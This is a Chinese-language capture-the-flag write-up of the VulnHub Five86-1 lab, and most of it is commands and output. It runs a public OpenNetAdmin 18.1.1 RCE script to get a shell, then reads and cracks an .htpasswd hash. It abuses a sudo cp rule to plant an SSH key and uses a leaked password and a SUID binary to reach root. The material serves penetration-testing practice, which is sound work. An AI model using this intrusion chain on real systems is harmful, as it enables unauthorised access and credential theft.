---
title: "Five86-1 Vulnhub靶场复现"
description: "Five86-1 Vulnhub靶场复现"
slug: "vulnhub-five86-1"
pubDate: "2026-10-11"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# Five86-1 VulnHub靶场复现

# 靶场复现

靶场地址 https://www.vulnhub.com/entry/five86-1%2C417/

介绍如下

```markdown
## Description

Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

## Technical Information

Five86-1 is a VirtualBox VM built on Debian 64 bit, but there shouldn't be any issues running it on most PCs.

Five86-1 has been tested successfully on VMWare Player, but if there are any issues running this VM in VMware, have a read through of [this](http://www.five86.com/vmware.html).

It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.

Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.

## Important

While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.

In saying that, there shouldn't be any problems, but I feel the need to throw this out there just in case.

## Credits

A big thanks goes out to the members of @m0tl3ycr3w.

## Contact

I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).

I can be contacted via Twitter - @Five86_x
```

### 靶场部署

默认是桥接，改为nat

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

获取靶机ip为 10.10.10.103

### 端口扫描与漏洞探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ sudo nmap -sS -sV -O -sC -p- --min-rate 5000 10.10.10.103
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 04:05 -0400
Nmap scan report for 10.10.10.103
Host is up (0.00059s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)
|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)
|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/ona
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:7A:0B:AF (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.17 seconds
```

| 端口      | 服务 | 标题/版本                                      | 备注                                                                  |
| --------- | ---- | ---------------------------------------------- | --------------------------------------------------------------------- |
| 22/tcp    | SSH  | OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | 登录入口，远程管理；存在 RSA / ECDSA / ED25519 host key               |
| 80/tcp    | HTTP | Apache httpd 2.4.38 ((Debian))                 | Web 入口；`robots.txt` 泄露 `Disallowed entry: /ona`；待目录/参数枚举 |
| 10000/tcp | HTTP | MiniServ 1.920 (Webmin httpd)                  | Webmin 管理入口；无标题，Charset=iso-8859-1；待版本/登录/漏洞枚举     |

nmap漏洞脚本探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ sudo nmap --script=vuln -p 22,80,10000 10.10.10.103
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 04:10 -0400
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.66% done; ETC: 04:10 (0:00:00 remaining)
Nmap scan report for 10.10.10.103
Host is up (0.00072s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /robots.txt: Robots file
|_  /reports/: Potentially interesting folder (401 Unauthorized)
10000/tcp open  snet-sensor-mgmt
| http-vuln-cve2006-3392:
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|
|     Disclosure date: 2006-06-29
|     References:
|       http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|_      http://www.exploit-db.com/exploits/1997/
MAC Address: 00:0C:29:7A:0B:AF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 32.32 seconds
```

| 端口      | 服务                    | 发现                                       | 备注                             |
| --------- | ----------------------- | ------------------------------------------ | -------------------------------- |
| 22/tcp    | SSH                     | 未发现漏洞                                 | 常规服务                         |
| 80/tcp    | HTTP (Apache)           | /reports/ 目录返回 401 Unauthorized        | 存在受保护目录，可能包含敏感报告 |
| 80/tcp    | HTTP (Apache)           | robots.txt 泄露 /ona 路径                  | 信息泄露                         |
| 10000/tcp | Webmin (MiniServ 1.920) | **CVE-2006-3392 (Webmin File Disclosure)** | 可任意读取文件，无需认证         |

### Web服务探测

在浏览器对80端口进行访问发现是个空白页面，稍后进行目录爆破

对10000端口访问，提示Error - Document follows

This web server is running in SSL mode. Try the URL `https://10.10.10.103:10000/` instead.

点击这个https，是一个Webmin登陆表单

### 目录爆破

```shell
sudo dirb http://10.10.10.103
```

- http://10.10.10.103/index.html (CODE:200|SIZE:30)
- http://10.10.10.103/reports (CODE:401|SIZE:459)
- http://10.10.10.103/robots.txt (CODE:200|SIZE:29)
- http://10.10.10.103/server-status (CODE:403|SIZE:277)

暴露出来这四个，其中目前有用的是 robots.txt reports

## 漏洞发现及其利用

### 访问/robots.txt 目录

```text
User-agent: *
Disallow: /ona
```

这里泄露一个新目录 /ona

### 访问 /ona

一个没见过的网页工具,在搜索引擎中得到以下信息

```text
OpenNetAdmin（简称 ONA）是一个开源的 ==‌**IP 地址管理（IPAM）工具**‌==，用来帮网络管理员跟踪和管理网络里的各种信息，比如 IP 地址、DNS 名称、子网、MAC 地址这些

它用 ‌**PHP + MySQL**‌ 开发，支持通过浏览器操作，也提供命令行工具，方便批量处理和自动化脚本
```

https://github.com/opennetadmin/ona 开源项目地址在这

值得注意的是

```text
You are NOT on the latest release version
Your version    = v18.1.1
Latest version = v19.0.3
```

目前的版本很旧，如果后面没有入手点，我们可以尝试找找这个项目版本的历史漏洞

甚至在GitHub搜索OpenNetAdmin 18.1.1 第一个就是这个项目的rce脚本

https://github.com/amriunix/ona-rce

### 访问 /reports

弹出一个登陆框，访问需要验证，目前没有任何信息可以支持我们进行尝试

### 利用公开rce脚本获取shell

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ git clone https://github.com/amriunix/ona-rce.git
正克隆到 'ona-rce'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 11 (delta 4), reused 9 (delta 2), pack-reused 0 (from 0)
接收对象中: 100% (11/11), 552.45 KiB | 4.25 MiB/s, 完成.
处理 delta 中: 100% (4/4), 完成.
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ ls
ona-rce
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ cd ona-rce
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1/ona-rce]
└─$ ls
ona-proof.png  ona-rce.py  README.md
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1/ona-rce]
└─$ chmod +x ona-rce.py
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1/ona-rce]
└─$ python3 ona-rce.py check http://10.10.10.103/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1/ona-rce]
└─$ python3 ona-rce.py exploit http://10.10.10.103/ona
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ whoami;id;pwd
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/opt/ona/www
sh$
```

### 寻找当前用户可以读取的文件

```shell
sh$ find / -type f -user www-data
```

/var/www/html/reports/.htaccess
/var/log/ona.log

```shell
sh$ cat /var/www/html/reports/.htaccess
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /var/www/.htpasswd
require valid-user
sh$ cat /var/log/ona.log
Dec 31 9:27:32 five86-1 anonymous@: [] INFO => Dropped existing DB: ona_onadb
Dec 31 9:27:32 five86-1 anonymous@: [] INFO => Added new DB: ona_onadb
Dec 31 9:27:33 five86-1 anonymous@: [] INFO => Creating and updating tables within new DB: ona_onadb
Dec 31 9:27:33 five86-1 anonymous@: [] INFO => Loaded data to new DB: ona_onadb
Dec 31 9:27:33 five86-1 anonymous@: [] INFO => Created new DB user: ona_sys
Dec 31 9:30:46 five86-1 guest@192.168.0.108: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Jan 1 4:22:51 five86-1 guest@192.168.0.140: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 8 4:23:42 five86-1 guest@10.10.10.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 2:59:20 five86-1 guest@10.10.10.1: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:00:40 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:01:33 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:01:45 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:02:36 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:02:52 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:03:57 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:04:42 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:04:46 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:05:21 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:05:45 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:05:49 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:06:17 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:06:34 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:06:43 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:06:46 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:06:58 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:07:26 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:08:07 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:08:39 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:08:43 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:08:51 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:08:55 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:09:45 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:09:59 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:10:12 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:12:39 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:13:55 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:14:24 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:14:24 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
Oct 11 3:14:51 five86-1 guest@10.10.10.10: [DEFAULT] ERROR => Login failure for guest using authtype local: Password incorrect
```

/var/www/.htpasswd 读取这个文件看看

```shell
sh$ cat /var/www/.htpasswd
douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

# To make things slightly less painful (a standard dictionary will likely fail),
# use the following character set for this 10 character password: aefhrt
```

里面是用户 douglas 的 Apache MD5 哈希，并且文件注释直接给出了密码长度和字符集提示

这里也提醒我忘记看有哪个用户了

```shell
sh$ ls /home/
douglas
jen
moss
richmond
roy
```

密码长度：10 位

可用字符集：aefhrt

在一个新终端进行如下操作

## 爆破用户 douglas 的密码

先识别hash类型，确定为md5

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
```

### 生成密码字典，然后爆破

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ crunch 10 10 aefhrt -o password.txt
Crunch will now generate the following amount of data: 665127936 bytes
634 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 60466176

crunch: 100% completed generating output
```

'echo '$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' > douglas.hash'

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ john --format=md5crypt --wordlist=password.txt douglas.hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fatherrrrr       (?)
1g 0:00:00:48 DONE (2026-10-11 03:33) 0.02059g/s 447056p/s 447056c/s 447056C/s fatherefaa..fatherrtet
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ john --show douglas.hash
?:fatherrrrr

1 password hash cracked, 0 left
```

得到密码fatherrrrr

接下来可以ssh登陆或者再之前获取的shell中切换用户

### ssh登陆用户douglas

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Five86-1]
└─$ ssh douglas@10.10.10.103
The authenticity of host '10.10.10.103 (10.10.10.103)' can't be established.
ED25519 key fingerprint is: SHA256:c8HTcx7tPvrbA31UeXE5fRobpanfPTTHV85muCC7LpI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.103' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
douglas@10.10.10.103's password:
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
douglas@five86-1:~$ id;pwd;whoami;uname -a;ls -liah
uid=1005(douglas) gid=1005(douglas) groups=1005(douglas)
/home/douglas
douglas
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
total 12K
295514 drwx------ 3 douglas douglas 4.0K Jan  1  2020 .
262150 drwxr-xr-x 7 root    root    4.0K Jan  1  2020 ..
262393 lrwxrwxrwx 1 douglas douglas    9 Jan  1  2020 .bash_history -> /dev/null
295542 drwx------ 2 douglas douglas 4.0K Jan  1  2020 .ssh
```

## 尝试在 douglas 用户下提权

```shell
douglas@five86-1:~$ sudo -l
Matching Defaults entries for douglas on five86-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User douglas may run the following commands on five86-1:
    (jen) NOPASSWD: /bin/cp
douglas@five86-1:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
```

发现可以用jen用户的身份无密码执行/bin/cp

而且 douglas 目录下有一个隐藏目录 .ssh 我们先看看

```shell
douglas@five86-1:~$ cd .ssh
douglas@five86-1:~/.ssh$ ls -liah
total 16K
295542 drwx------ 2 douglas douglas 4.0K Jan  1  2020 .
295514 drwx------ 3 douglas douglas 4.0K Jan  1  2020 ..
262384 -rw------- 1 douglas douglas 1.8K Jan  1  2020 id_rsa
262388 -rw-r--r-- 1 douglas douglas  398 Jan  1  2020 id_rsa.pub
```

能做什么？我们把 douglas 的公钥丢进 jen 目录，然后ssh免登陆

## 切换到 jen 用户

```shell
douglas@five86-1:~/.ssh$ cp id_rsa.pub /tmp/authorized_keys
douglas@five86-1:~/.ssh$ chmod 777 /tmp/authorized_keys
douglas@five86-1:~/.ssh$ sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh
douglas@five86-1:~/.ssh$ ssh jen@10.10.10.103
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
jen@five86-1:~$
```

### 为什么新建的文件是这个名字呢？

authorized_keys 不是系统自动生成的，它是 **SSH 公钥认证** 用来存放“允许登录的公钥”的文件，所以当以这种方式免密登陆时，我们需要创建这个文件

### 查看邮箱

ssh提示有一封新邮件

```shell
jen@five86-1:~$ cd /var/mail
jen@five86-1:/var/mail$ ls -liah
total 12K
 241 drwxrwsr-x  2 root mail 4.0K Jan  1  2020 .
  12 drwxr-xr-x 14 root root 4.0K Jan  1  2020 ..
6706 -rw-rw----  1 jen  mail  885 Jan  1  2020 jen
jen@five86-1:/var/mail$ cat jen
From roy@five86-1 Wed Jan 01 03:17:00 2020
Return-path: <roy@five86-1>
Envelope-to: jen@five86-1
Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500
Received: from roy by five86-1 with local (Exim 4.92)
        (envelope-from <roy@five86-1>)
        id 1imZBc-0001FU-El
        for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500
To: jen@five86-1
Subject: Monday Moss
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1imZBc-0001FU-El@five86-1>
From: Roy Trenneman <roy@five86-1>
Date: Wed, 01 Jan 2020 03:17:00 -0500
Hi Jen,
As you know, I'll be on the "customer service" course on Monday due to that incident on Level 4 with the accounts people.
But anyway, I had to change Moss's password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!
Moss will understand (ha ha ha ha).
Tanks,
Roy
```

用户 Moss 的密码遭到泄露 Fire!Fire!

## 切换到 Moss 用户

```shell
jen@five86-1:/var/mail$ ssh moss@10.10.10.103
The authenticity of host '10.10.10.103 (10.10.10.103)' can't be established.
ECDSA key fingerprint is SHA256:aE9ZqWXrvGgzgM21BjQ23GmxQVBeD5CZw0nUq8P8RyM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.103' (ECDSA) to the list of known hosts.
moss@10.10.10.103's password:
Linux five86-1 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
moss@five86-1:~$
```

## 提权到root

```shell
moss@five86-1:~$ ls -liah
total 12K
295510 drwx------ 3 moss moss 4.0K Jan  1  2020 .
262150 drwxr-xr-x 7 root root 4.0K Jan  1  2020 ..
262385 lrwxrwxrwx 1 moss moss    9 Jan  1  2020 .bash_history -> /dev/null
295530 drwx------ 2 moss moss 4.0K Jan  1  2020 .games
moss@five86-1:~$ cd .games
moss@five86-1:~/.games$ ls -liah
total 28K
295530 drwx------ 2 moss moss 4.0K Jan  1  2020 .
295510 drwx------ 3 moss moss 4.0K Jan  1  2020 ..
295532 lrwxrwxrwx 1 moss moss   21 Jan  1  2020 battlestar -> /usr/games/battlestar
295540 lrwxrwxrwx 1 moss moss   14 Jan  1  2020 bcd -> /usr/games/bcd
295533 lrwxrwxrwx 1 moss moss   21 Jan  1  2020 bombardier -> /usr/games/bombardier
295534 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 empire -> /usr/games/empire
295541 lrwxrwxrwx 1 moss moss   20 Jan  1  2020 freesweep -> /usr/games/freesweep
295539 lrwxrwxrwx 1 moss moss   15 Jan  1  2020 hunt -> /usr/games/hunt
295535 lrwxrwxrwx 1 moss moss   20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
264924 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 nsnake -> /usr/games/nsnake
295531 lrwxrwxrwx 1 moss moss   25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
295536 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 petris -> /usr/games/petris
295537 lrwxrwxrwx 1 moss moss   16 Jan  1  2020 snake -> /usr/games/snake
266999 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 sudoku -> /usr/games/sudoku
295551 -rwsr-xr-x 1 root root  17K Jan  1  2020 upyourgame
295538 lrwxrwxrwx 1 moss moss   16 Jan  1  2020 worms -> /usr/games/worms
```

在moss目录下发现一个.games目录下upyougame文件，运行即可获取root权限

```text
moss@five86-1:~/.games$ ./upyourgame
Would you like to play a game?
fuck
Could you please repeat that?
fuck
Nope, you'll need to enter that again.
fuck
You entered: No.  Is this correct? fuck
We appear to have a problem?  Do we have a problem? fuck
Made in Britain.
#
```

随便输入字符均可，不用和我一样都是fuck

## 获取flag

```shell
# ls -liah
total 28K
295530 drwx------ 2 moss moss 4.0K Jan  1  2020 .
295510 drwx------ 3 moss moss 4.0K Jan  1  2020 ..
295532 lrwxrwxrwx 1 moss moss   21 Jan  1  2020 battlestar -> /usr/games/battlestar
295540 lrwxrwxrwx 1 moss moss   14 Jan  1  2020 bcd -> /usr/games/bcd
295533 lrwxrwxrwx 1 moss moss   21 Jan  1  2020 bombardier -> /usr/games/bombardier
295534 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 empire -> /usr/games/empire
295541 lrwxrwxrwx 1 moss moss   20 Jan  1  2020 freesweep -> /usr/games/freesweep
295539 lrwxrwxrwx 1 moss moss   15 Jan  1  2020 hunt -> /usr/games/hunt
295535 lrwxrwxrwx 1 moss moss   20 Jan  1  2020 ninvaders -> /usr/games/ninvaders
264924 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 nsnake -> /usr/games/nsnake
295531 lrwxrwxrwx 1 moss moss   25 Jan  1  2020 pacman4console -> /usr/games/pacman4console
295536 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 petris -> /usr/games/petris
295537 lrwxrwxrwx 1 moss moss   16 Jan  1  2020 snake -> /usr/games/snake
266999 lrwxrwxrwx 1 moss moss   17 Jan  1  2020 sudoku -> /usr/games/sudoku
295551 -rwsr-xr-x 1 root root  17K Jan  1  2020 upyourgame
295538 lrwxrwxrwx 1 moss moss   16 Jan  1  2020 worms -> /usr/games/worms
# cd /root
# ls -liah
total 24K
262152 drwx------  3 root root 4.0K Jan  1  2020 .
     2 drwxr-xr-x 18 root root 4.0K Dec 31  2019 ..
266111 lrwxrwxrwx  1 root root    9 Dec 31  2019 .bash_history -> /dev/null
262372 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
262387 -rwx------  1 root root   33 Jan  1  2020 flag.txt
295523 drwxr-xr-x  3 root root 4.0K Jan  1  2020 .local
262371 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
# cat flag.txt
8f3b38dd95eccf600593da4522251746
```

## 为什么没有利用10000端口的服务

Nmap http-vuln-cve2006-3392 报 VULNERABLE，但目标 Webmin 1.920 不受 CVE-2006-3392 影响，判断为误报，未利用，因此我转头用了ona-rce脚本
